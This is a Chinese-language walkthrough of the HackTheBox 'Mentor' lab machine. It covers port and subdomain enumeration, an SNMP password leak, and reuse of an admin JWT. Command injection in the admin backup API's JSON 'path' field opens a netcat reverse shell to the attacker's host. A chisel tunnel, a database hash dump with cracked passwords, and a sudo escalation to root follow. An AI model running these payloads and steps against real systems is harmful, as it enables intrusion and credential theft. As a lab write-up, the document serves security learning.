<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/vSdK24C80TAzdRH0OQCGIw)

title: HTB-Mentor

top: false

toc: true

mathjax: false

date: 2023-03-12 14:04:00

author: wa0er

img: /medias/article_cover/Mentor.png

password:

summary: HackTheBox-Mentor

keywords: HackTheBox

tags: HackTheBox‍‍

信息收集
----

nmap

```
┌──(root💀kali)-[~/Desktop]
└─# nmap -sC -sV -oA nmap/result 10.10.11.193
Starting Nmap 7.91 ( https://nmap.org ) at 2023-03-05 19:47 EST
Nmap scan report for 10.10.11.193
Host is up (0.38s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c7:3b:fc:3c:f9:ce:ee:8b:48:18:d5:d1:af:8e:c2:bb (ECDSA)
|_  256 44:40:08:4c:0e:cb:d4:f1:8e:7e:ed:a8:5c:68:a4:f7 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://mentorquotes.htb/
Service Info: Host: mentorquotes.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 74.40 seconds

```

开放端口：22（SSH）、80（HTTP），域名`http://mentorquotes.htb/`

添加域名到本地 hosts 文件

```
echo "10.10.11.193  mentorquotes.htb" >> /etc/hosts

```

URL 访问`http://mentorquotes.htb/`

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShPciaLyZXibb8CDxvHoMbgO0Y1RibNQHNWEBZib21Rcz591tyMVInhOcIwA/640?wx_fmt=png)

wfuzz 一下子域

```
┌──(root💀kali)-[~/Desktop]
└─# wfuzz -H "Host: FUZZ.mentorquotes.htb" --hc 302,400 -t 50 -H "User-Agent: wa0er" -c -z file,"/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt" http://mentorquotes.htb/
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************
Target: http://mentorquotes.htb/
Total requests: 38267
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                              
=====================================================================
000000142:   404        0 L      2 W        22 Ch       "api"                                                
Total time: 0
Processed Requests: 38267
Filtered Requests: 38266
Requests/sec.: 0

```

得 api 子域，将 api 子域添加进本地 hosts 文件

```
echo "10.10.11.193  api.mentorquotes.htb" >> /etc/hosts

```

访问`api.mentorquotes.htb`，是 404

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShib1Z4eqLutsWpXo1UxaHKOQXnIM606TDiaX02ZDOZdWUVD8rKteKYWWg/640?wx_fmt=png)

ffuf 爆破一下`api.mentorquotes.htb`的目录

```
┌──(root💀kali)-[~/Desktop]
└─# ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -u http://api.mentorquotes.htb/FUZZ -t 50
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       
       v2.0.0-dev
________________________________________________
 :: Method           : GET
 :: URL              : http://api.mentorquotes.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________
[Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 292ms]
    * FUZZ: admin
[Status: 200, Size: 969, Words: 194, Lines: 31, Duration: 533ms]
    * FUZZ: docs
[Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 362ms]
    * FUZZ: users
[Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 1082ms]
    * FUZZ: quotes
[Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 863ms]
    * FUZZ: server-status
:: Progress: [38267/38267] :: Job [1/1] :: 125 req/sec :: Duration: [0:04:47] :: Errors: 0 ::

```

得到`api.mentorquotes.htb`四个目录：`/admin`、`/docs`、`/users`、`/quotes`、`/server-status`

`api.mentorquotes.htb/admin`如下

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShoCm1x8FsXadqqylVBaD0TPmSIAXJhgG0ubI0vC4NFSD4ZicicyY4LjnA/640?wx_fmt=png)

`api.mentorquotes.htb/docs`如下，用的 Swagger UI，页面能看到很多 API

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShHrH8YsMLKdkEdibpgGVaeZdRWbUUtKOTMjwE6C7yurRxog63ZwaEPVg/640?wx_fmt=png)

可以看到这个站点的站主是 james，并且他的邮箱是`james@mentorquotes.htb`

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShiaTaLliaia1Hqdf052mfgicpuNQvGkmZrXwtMQgSyr7LjwEnyBe9ibx4Viag/640?wx_fmt=png)

在`/auth/signup`尝试注册账户，如下界面，填写 email、username、password，点击 Execute，同时 Burp 抓包

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShDbb7xHz7OJyrs8ib1HTnZibURN9qITHlJ6I2D7XtkLSicF1bmgdAXK2YA/640?wx_fmt=png)

Burp 抓包重放，如下，可看到账户已被创建

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMSh796ZNrDnibsrSH00flreqdroLxNrYgfGmrna9yA4Jdtib6Yrbox2bhmg/640?wx_fmt=png)

尝试用刚创建的账户在`/auth/login`登录，填写 email、username、password，点击 Execute，依然 Burp 抓包

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShSicUFbia9KrLltJGZPqvYdKQFIlrGOYaLoLKZic74vx4Gn70lx5rUQ89A/640?wx_fmt=png)

Burp 重放，发现返回了一串 JWT（JsonWebToken，下简称 JWT，JWT 典型的三段结构：xxx.xxx.xxx）

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShU2D1KObFF4GKXMo56EuSYEZAsbgDYxTkibTXe90iahPsTVT2eMws4SBA/640?wx_fmt=png)

```
"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InN0cmluZyIsImVtYWlsIjoid2EwZXJAZXhhbXBsZS5jb20ifQ.HfrTNgZInwCjDjfhO447ojuw5lEZWi03NmrENknZJZ8"

```

`/users`目录应该是所有用户的信息，于是在`/users`目录尝试登录，如果直接登录，会发现提示需要 Authorization 字段，那我们就抓包在请求头添加如下 Authorization 键值对，重放 HTTP 请求，发现提示只允许 admin 用户访问

```
Authorization:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InN0cmluZyIsImVtYWlsIjoid2EwZXJAZXhhbXBsZS5jb20ifQ.HfrTNgZInwCjDjfhO447ojuw5lEZWi03NmrENknZJZ8

```

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShwAtv8Vr0C42LibSJ0HnLTlZHWufL1IstOjYdH0UvOfbAkk0QicCpoCeg/640?wx_fmt=png)

然后尝试用 james 用户的邮箱用户名去注册，发现会提示用户已存在

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShBmOrpXRzJCkm4hdQmiaZUrFoOxpGXcS4kqFV7ht7BOPGvXkZSfXSLaQ/640?wx_fmt=png)

随后进行百般尝试，发现它验证用户是否已存在的逻辑是：当 email 和 username 同时匹配到相同的值时，才会认定此用户已存在。于是尝试伪造管理员用户获取管理员 JWT（这里的管理员用户推测应该是站主 james 或者 admin）。

但随后用`注册→登录（获取JWT）→/users目录`尝试了以下 5 种组合，均提示只有 admin 用户能访问该资源

```
{
    "email":"james@mentorquotes.htb",
    "username":"wa0er",
    "password":"wa0erwa0er"
}

```

```
{
    "email":"wa0er@mentorquotes.htb",
    "username":"james",
    "password":"wa0erwa0er"
}

```

```
{
    "email":"admin@mentorquotes.htb",
    "username":"admin",
    "password":"wa0erwa0er"
}

```

```
{
    "email":"admin@mentorquotes.htb",
    "username":"wa0er",
    "password":"wa0erwa0er"
}

```

```
{
    "email":"wa0er@mentorquotes.htb",
    "username":"admin",
    "password":"wa0erwa0er"
}

```

随后整理思路，在一次 nmap 扫描中，看到如下信息

```
┌──(root💀kali)-[~/Desktop]
└─# nmap -sU 10.10.11.193
Starting Nmap 7.91 ( https://nmap.org ) at 2023-03-11 21:40 EST
Nmap scan report for mentorquotes.htb (10.10.11.193)
Host is up (0.23s latency).
Not shown: 998 closed ports
PORT    STATE         SERVICE
68/udp  open|filtered dhcpc
161/udp open|filtered snmp
Nmap done: 1 IP address (1 host up) scanned in 1031.83 seconds

```

68 端口（DHCPC）和 161 端口（SNMP）开放，DHCP 可能的攻击主要就是拒绝服务和中间人攻击，用不上，那就从 SNMP 下手。

SNMP 全称简单网络管理协议，是专门设计用于在 IP 网络管理网络节点（服务器、工作站、路由器、交换机及 HUBS 等）的一种标准协议，是一种应用层协议。通过 SNMP 可以访问设备信息、改写和配置设备参数等，SNMP 运行在 UDP161 端口上，采用 UDP 协议在管理端和 agent 之间传输信息。

试试用`snmpbulkwalk`读取相关配置信息

https://linux.die.net/man/1/snmpbulkwalk

```
snmpbulkwalk -c internal -v2c 10.10.11.193 > snmpbulk_mentor
注：
-v 1|2c|3  指定SNMP版本
-c COMMUNITY  指定community string
-m MIB[:...]  指定MIB文件（此处没用到）

```

查看刚读取的配置信息，搜索带有 login 字符串的条目，发现`/usr/local/bin/login.py`有一个字符串`kj23sadkj123as0-d213`，可能是管理员的登录密码

```
cat snmpbulk mentor | grep login

```

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShZVln9iaScJErKe3v822HnxBb35J4TfmclbJdOSibSxJ1TuoggtAA9jOA/640?wx_fmt=png)

我们到`/auth/login`目录，用 james 的邮箱和用户名，密码填写刚获得的密码，成功登录，获取到 james 账户 JWT

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMSh27rQwJy6lrFZWcjB03lAGQCZicv3sOK4jFPdAMF7VW2iakQhgXAq2XQw/640?wx_fmt=png)

```
"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0"
Authorization:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0

```

命令执行
----

访问`/users/`目录，成功拿到用户列表，主要是两个用户：james 和 service_acc

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShWMWZdLm2GhKEic3z2yficNyKLIib0urCGibsZibArAUeNFtJrDdHb2qaEPg/640?wx_fmt=png)

刚才我们爆破出了`/admin`目录，我们重新用这个 JWT 访问此目录，发现有两个功能目录

```
"admin_funcs":{
    "check db connection":"/check",
    "backup the application":"/backup"

```

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShTG0FkrdUXojxlI18WcDj0X0OmhxzgvtkA3IBkSheoGXH0HUGeAxyibA/640?wx_fmt=png)

访问`/admin/check`，返回`Not implemented yet!`

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShFRRTnoCPTDTia9xZKNkJQMuDFibTJialuzia3yZhTZQeUlpvdzmOMQPj7Q/640?wx_fmt=png)

访问`/admin/backup`，返回`Method Not Allowed`

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShpeibdibDSz2JQnLA259oWTp3mhuHpibKZJ3PPEIf4BagDSibK0BWes9KQg/640?wx_fmt=png)

在请求头区域单击鼠标右键，选择`Change request method`，自动切换成 POST 方法，点击`send`发送数据包后，

可看到响应包`content-type`值为`application/json`，再加上数据部分的报错，意思就是请求包需要有带 body 属性的 json 对象

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShbtXQKelfXu6mdU8Hc90Bywv9RbYZ6BW56w4WdGsibrgEAaa7xiaic5p2Q/640?wx_fmt=png)

修改`content-type`值为`application/json`，请求头内容添加 json 对象，body 为空就行，又提示需要 path 属性

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShLe3srFV7FINRloH8js4Y86FlSolFMxGcXW7O8XopfawRTTic1uYEMBA/640?wx_fmt=png)

于是在请求头内容添加 body 属性和 path 属性，返回`Done!`，嗯？？？，Done 了个寂寞，应该是代入执行了

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShYicvP2ssr9224tZRwc7ibBdiaabNfgo2u34rNFIIRUz9KVSHQuJERlx9A/640?wx_fmt=png)

那我们就尝试执行命令，修改 body 如下，也就是 ping 本地主机（务必记得末尾加分号！）

在发送请求包前在本地开启 tcpdump 捕获数据包

```
tcpdump -i tun0 icmp   #只捕获tun0网卡的icmp协议数据包

```

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMSh3QXticU5YEMm70cwXphXZl1AC1Y2ToKPEicWu6rQvV0PcW2DviaQWQickg/640?wx_fmt=png)

发送请求包后，可在本地看到有数据包被捕获，说明命令被成功执行

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShJJ1N1aOgaJ8LVTzLt5ljC0zicviatmib4ELEzNLHmvt7S942pXFeiaJe1g/640?wx_fmt=png)

那就构造如下请求包，本地开启 nc 监听

```
nc -nvlp 9898

```

```
POST /admin/backup HTTP/1.1
Host: api.mentorquotes.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Authorization:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://api.mentorquotes.htb/docs
Connection: close
Content-Type: application/json
Content-Length: 108
{
    "body": "wa0er",
    "path":"/;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.X.X 9898 >/tmp/f;"
}

```

成功反弹 shell，获取到 root 权限，但看到 nc 提示`sh: can't access tty; job control turned off`，这说明根本就没有进到控制终端，可能是个虚拟环境之类的，尝试读取`/root/root.txt`文件发现确实没有，所以还要进一步 getshell

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShwt7uwhibgde6bEP0VJdZaJoRHatvOfPGELllubuZFfMibfXcfc7iciaxYw/640?wx_fmt=png)

`/app/app`目录下有`db.py`

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShsibxG8s93T8pu7lDBWFlVYvjUMqTJ7KwYUE9mgAgKxsLQm79XZ4MOqQ/640?wx_fmt=png)

`db.py`内容如下

```
import os
from sqlalchemy import (Column, DateTime, Integer, String, Table, create_engine, MetaData)
from sqlalchemy.sql import func
from databases import Database
# Database url if none is passed the default one is used
DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://postgres:postgres@172.22.0.1/mentorquotes_db")
# SQLAlchemy for quotes
engine = create_engine(DATABASE_URL)
metadata = MetaData()
quotes = Table(
    "quotes",
    metadata,
    Column("id", Integer, primary_key=True),
    Column("title", String(50)),
    Column("description", String(50)),
    Column("created_date", DateTime, default=func.now(), nullable=False)
)
# SQLAlchemy for users
engine = create_engine(DATABASE_URL)
metadata = MetaData()
users = Table(
    "users",
    metadata,
    Column("id", Integer, primary_key=True),
    Column("email", String(50)),
    Column("username", String(50)),
    Column("password", String(128) ,nullable=False)
)
# Databases query builder
database = Database(DATABASE_URL)

```

为了与 PostgreSQL 数据库交互，需要用到`chisel`工具

chisel 工具：https://github.com/jpillora/chisel

从本地传一个 chisel

```
本地：python3 -m http.server 80
靶机：wget http://[本地IP]/chisel

```

（PS：这里看到靶机 IP 为 10.129.89.191，与之前的 10.10.11.193 不一致，是因为靶机中间网络中断，我切换过靶机环境，本质上他俩都是这台靶机地址）

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShjS75GPkXPvlT1Cx1kJElZbxXZOKYBNMMFC1zJ70Ib3Vl4iafxbLyWMw/640?wx_fmt=png)

将 chisel 复制到`/tmp`文件夹下，并添加可执行权限

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShSoq0GawQEfH6uwtDtTq8Dtm6ibpawTlCvX1uia1FmuicDRoBtqY6FGibYw/640?wx_fmt=png)

本地执行：

```
chmod +x chisel
./chisel server --port 9899 --reverse

```

靶机执行：

```
chmod +x chisel
./chisel client -v 10.10.X.X:9899 R:5432:172.22.0.1:5432

```

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShj1VHDWGguAE0cs5icCVlj9rlOPLlhURnv0iaj1FtkLTY0ftcE1tonodg/640?wx_fmt=png)

连接数据库，密码是`postgres`

```
┌──(root💀kali)-[~/Desktop]
└─# psql -h 10.10.X.X -U "postgres" -p 5432
Password for user postgres: 
psql (13.2 (Debian 13.2-1), server 13.7 (Debian 13.7-1.pgdg110+1))
Type "help" for help.
postgres=# \list
                                    List of databases
      Name       |  Owner   | Encoding |  Collate   |   Ctype    |   Access privileges   
-----------------+----------+----------+------------+------------+-----------------------
 mentorquotes_db | postgres | UTF8     | en_US.utf8 | en_US.utf8 | 
 postgres        | postgres | UTF8     | en_US.utf8 | en_US.utf8 | 
 template0       | postgres | UTF8     | en_US.utf8 | en_US.utf8 | =c/postgres          +
                 |          |          |            |            | postgres=CTc/postgres
 template1       | postgres | UTF8     | en_US.utf8 | en_US.utf8 | =c/postgres          +
                 |          |          |            |            | postgres=CTc/postgres
(4 rows)
postgres=# \c mentorquotes_db 
psql (13.2 (Debian 13.2-1), server 13.7 (Debian 13.7-1.pgdg110+1))
You are now connected to database "mentorquotes_db" as user "postgres".
mentorquotes_db=# \d
              List of relations
 Schema |     Name      |   Type   |  Owner   
--------+---------------+----------+----------
 public | cmd_exec      | table    | postgres
 public | quotes        | table    | postgres
 public | quotes_id_seq | sequence | postgres
 public | users         | table    | postgres
 public | users_id_seq  | sequence | postgres
(5 rows)
mentorquotes_db=# select * from users;
 id |         email          |  username   |             password             
----+------------------------+-------------+----------------------------------
  1 | james@mentorquotes.htb | james       | 7ccdcd8c05b59add9c198d492b36a503
  2 | svc@mentorquotes.htb   | service_acc | 53f22d0dfa10dce7e29cd31f4f953fd8
  4 | wa0er@mentorquotes.htb | james       | ad4ece449e52f57769466a281720b825
  5 | james@mentorquotes.htb | wa0er       | ad4ece449e52f57769466a281720b825
  6 | admin@mentorquotes.htb | admin       | ad4ece449e52f57769466a281720b825
(5 rows)

```

获取到用户密码 hash 值，只有前两个有用，后面的是之前自己添加的

破解一下 https://crackstation.net/

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShqVjJLqf03jhs8tiaibdvWmMYWaM3nTCZpdO2MsJFkuMibjxTOYUCUC8jA/640?wx_fmt=png)

得到 svc 账户的密码

```
123meunomeeivani

```

登录 ssh

```
┌──(root💀kali)-[~/Desktop]
└─# ssh svc@10.10.11.193
svc@10.10.11.193's password: 
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-56-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
  System information as of Thu Mar  9 09:03:14 AM UTC 2023
  System load:                      0.0
  Usage of /:                       65.3% of 8.09GB
  Memory usage:                     15%
  Swap usage:                       0%
  Processes:                        243
  Users logged in:                  0
  IPv4 address for br-028c7a43f929: 172.20.0.1
  IPv4 address for br-24ddaa1f3b47: 172.19.0.1
  IPv4 address for br-3d63c18e314d: 172.21.0.1
  IPv4 address for br-7d5c72654da7: 172.22.0.1
  IPv4 address for br-a8a89c3bf6ff: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.193
  IPv6 address for eth0:            dead:beef::250:56ff:feb9:d789
0 updates can be applied immediately.
The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Last login: Mon Dec 12 10:22:58 2022 from 10.10.14.40
svc@mentor:~$ id
uid=1001(svc) gid=1001(svc) groups=1001(svc)
svc@mentor:~$ pwd
/home/svc

```

权限提升
----

从本地传一个`linpeas`工具，运行一下，分析可看到有 SNMP 服务的相关配置文件

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShJxr8NRdS9x37UX8Z6QDFhQDpcaCibH9DfglDu8GpW46oF4MjLqYouJA/640?wx_fmt=png)

查看`/etc/snmp/snmpd.conf`，可看到有个密码，站点属主是 james，那应该就是 james 的密码（这个密码跟之前的密码不一样，可能前面的那个只是平台 james 管理员的密码，这个地方是 linux 终端 james 用户的密码）

```
svc@mentor:/tmp$ cat /etc/snmp/snmpd.conf

```

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShO8EDvlpIoxPsoYnEkg7TDfAnW0exZLXROAuqNDibKgM83sEj7oqWcvQ/640?wx_fmt=png)

```
SuperSecurePassword123__

```

切换到 james 用户，执行`sudo -l`可看到 james 用户有执行`/bin/sh`命令的权限

```
svc@mentor:/tmp$ su james
Password: 
james@mentor:/tmp$ id
uid=1000(james) gid=1000(james) groups=1000(james)
james@mentor:/tmp$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on mentor:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
User james may run the following commands on mentor:
    (ALL) /bin/sh

```

执行`/bin/sh`，成功获取 root 权限

```
james@mentor:/tmp$ sudo /bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)

```

Over！

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShLChDtK2EhZsrVAsdia6phy7iawKhYGGbT9CPN1e4P3UuyV91FiajbnI6w/640?wx_fmt=png)

总结
--

1.

信息收集得到`Swagger UI`页面、SNMP 服务、诸多有效目录；

2.

SNMP 配置信息泄露管理员 james 密码；

3.

登录 james 用户获取管理员 JWT；

4.

利用管理员 JWT 命令执行获取虚拟 root 权限；

5.

发现 PostgreSQL 数据库，与之交互获取 ssh 账户；

6.

登录 ssh 账户运行 linpeas，从 SNMP 配置文件拿到 james 终端密码；

7.

切换 james 终端用户，提权获取 root 权限。

参考
--

Hackthebox Mentor Writeup：https://0xdedinfosec.vercel.app/blog/hackthebox-mentor-writeup

实战 SNMP 服务攻击：https://www.freebuf.com/articles/network/319234.html